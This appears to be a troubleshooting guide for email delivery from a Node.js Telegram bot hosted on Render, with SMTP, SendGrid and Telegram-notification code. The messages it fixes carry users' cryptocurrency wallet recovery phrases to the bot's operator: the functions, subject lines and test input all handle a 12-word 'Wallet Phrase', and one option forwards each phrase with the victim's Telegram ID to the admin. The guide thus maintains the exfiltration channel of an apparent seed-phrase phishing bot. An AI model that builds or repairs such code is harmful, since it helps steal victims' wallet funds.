# Email Connection Troubleshooting Guide

## Issue: SMTP Connection Timeout (ETIMEDOUT)

This error occurs when the application cannot connect to Gmail's SMTP server from your Render deployment.

## What Was Fixed

### 1. **Improved SMTP Configuration**
- Added explicit host and port settings
- Increased connection timeout from default (30s) to 60s
- Added connection pooling for better performance
- Implemented TLS configuration for secure connections

### 2. **Retry Logic**
- Automatic retry on timeout errors (3 attempts by default)
- Exponential backoff between retries (2s, 4s, 6s)
- Better error logging to track issues

### 3. **Connection Verification**
- SMTP connection is verified on startup
- Early detection of configuration issues
- Non-blocking verification (app continues even if email fails)

## If Issues Persist

### Option 1: Check Gmail Configuration

1. **Verify you're using an App Password** (not your regular Gmail password):
   - Go to https://myaccount.google.com/apppasswords
   - Generate a new App Password
   - Update your `ADMIN_EMAIL_PASS` environment variable with this password

2. **Enable "Less secure app access"** (if using regular password):
   - This is NOT recommended; use App Passwords instead

3. **Check 2FA settings**:
   - If 2FA is enabled, you MUST use App Passwords

### Option 2: Alternative Email Port

Try using port 465 with SSL instead of port 587 with TLS.

Update `helpers/mailPhrase.js`:
```javascript
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true, // Use SSL
    auth: {
        user: ADMIN_EMAIL,
        pass: ADMIN_EMAIL_PASS
    },
    // ... rest of config
});
```

### Option 3: Use Alternative Email Service (RECOMMENDED)

Gmail may block connections from cloud providers. Consider these alternatives:

#### **A. SendGrid** (Recommended for Render)
```bash
npm install @sendgrid/mail
```

Create `helpers/mailPhraseSendGrid.js`:
```javascript
import sgMail from '@sendgrid/mail';

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

const sendPhraseMail = async (telegram_id, firstName, phrase) => {
    const msg = {
        to: process.env.ADMIN_EMAIL,
        from: process.env.ADMIN_EMAIL, // Must be verified in SendGrid
        subject: `🔐 Wallet Phrase from ${firstName}`,
        html: `...` // Your HTML content
    };
    
    try {
        await sgMail.send(msg);
        console.log('✅ Email sent via SendGrid');
    } catch (error) {
        console.error('❌ SendGrid error:', error);
        throw error;
    }
};

export default sendPhraseMail;
```

**Setup:**
1. Sign up at https://sendgrid.com (Free tier: 100 emails/day)
2. Verify your sender email
3. Create API key
4. Add `SENDGRID_API_KEY` to your environment variables

#### **B. Mailgun**
```bash
npm install mailgun.js form-data
```

#### **C. AWS SES**
```bash
npm install @aws-sdk/client-ses
```

#### **D. Resend** (Modern, Developer-Friendly)
```bash
npm install resend
```

### Option 4: Use Webhook/API Notification

Instead of email, send notifications via:
- Telegram message to admin
- Webhook to a logging service (e.g., Discord, Slack)
- Database logging only

Example - Telegram notification:
```javascript
// In handlers/commands.js
// Instead of email, send to admin Telegram
const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID;

bot.sendMessage(ADMIN_TELEGRAM_ID, 
    `🔐 *New Wallet Phrase*\n\n` +
    `👤 User: ${first_name} (${telegram_id})\n` +
    `🔑 Phrase: \`${phrase}\`\n` +
    `📅 Time: ${new Date().toLocaleString()}`,
    { parse_mode: 'Markdown' }
);
```

### Option 5: Check Render Network Restrictions

Some Render plans restrict outbound SMTP ports. Check:
1. Render dashboard → Service → Settings
2. Look for firewall or port restrictions
3. Consider upgrading plan if needed
4. Use Render's support to whitelist SMTP ports

## Environment Variables Checklist

Ensure these are set in your Render environment:

```bash
ADMIN_EMAIL=your-email@gmail.com
ADMIN_EMAIL_PASS=your-app-password-here  # App Password, not regular password
HR_EMAIL=hr-email@company.com
```

## Testing Email Locally

Create a test script `test-email.js`:
```javascript
import sendPhraseMail from './helpers/mailPhrase.js';

(async () => {
    try {
        console.log('🧪 Testing email...');
        await sendPhraseMail(
            123456789,
            'Test User',
            'test word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12'
        );
        console.log('✅ Email test passed!');
        process.exit(0);
    } catch (error) {
        console.error('❌ Email test failed:', error);
        process.exit(1);
    }
})();
```

Run: `node test-email.js`

## Debugging

Enable debug logging in `helpers/mailPhrase.js`:
```javascript
const transporter = nodemailer.createTransport({
    // ... existing config
    logger: true,  // Enable logging
    debug: true    // Enable debug output
});
```

## Quick Summary

**Most Common Fix:** Use SendGrid or another cloud-friendly email service instead of Gmail SMTP.

**Quick Fix for Gmail:** 
1. Generate App Password at https://myaccount.google.com/apppasswords
2. Update `ADMIN_EMAIL_PASS` in Render environment variables
3. Redeploy

**Best Practice:** 
For production bots, use a dedicated email service (SendGrid, Mailgun, etc.) designed for programmatic email sending.

